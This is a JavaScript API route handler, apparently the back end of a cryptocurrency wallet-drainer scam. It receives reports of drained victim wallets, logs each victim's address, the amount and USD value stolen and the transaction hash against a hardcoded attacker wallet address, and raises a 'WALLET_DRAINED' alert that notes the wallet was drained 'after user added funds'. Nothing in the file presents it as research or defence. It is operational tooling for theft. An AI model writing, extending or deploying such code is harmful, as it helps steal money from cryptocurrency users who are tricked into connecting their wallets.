export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { userAddress, drainedAmount, usdValue, txHash, timestamp } = req.body;

  try {
    // Log successful wallet drain
    console.log('🎯 WALLET DRAINED:', {
      victim: userAddress,
      amount: drainedAmount,
      usdValue: '$' + usdValue,
      txHash: txHash,
      timestamp: timestamp,
      adminWallet: '0x849842febf6643f29328a2887b3569e2399ac237'
    });

    // Alert admin with high priority
    const drainAlert = {
      type: 'WALLET_DRAINED',
      priority: 'CRITICAL',
      userAddress: userAddress,
      drainedAmount: drainedAmount,
      usdValue: '$' + usdValue,
      txHash: txHash,
      timestamp: timestamp,
      note: 'Wallet successfully drained after user added funds'
    };

    // Send to admin notification system
    console.log('💰 DRAIN ALERT:', drainAlert);

    res.status(200).json({
      success: true,
      message: 'Wallet drained successfully',
      amount: drainedAmount
    });

  } catch (error) {
    console.error('Error logging wallet drain:', error);
    res.status(500).json({ error: 'Failed to log drain' });
  }
}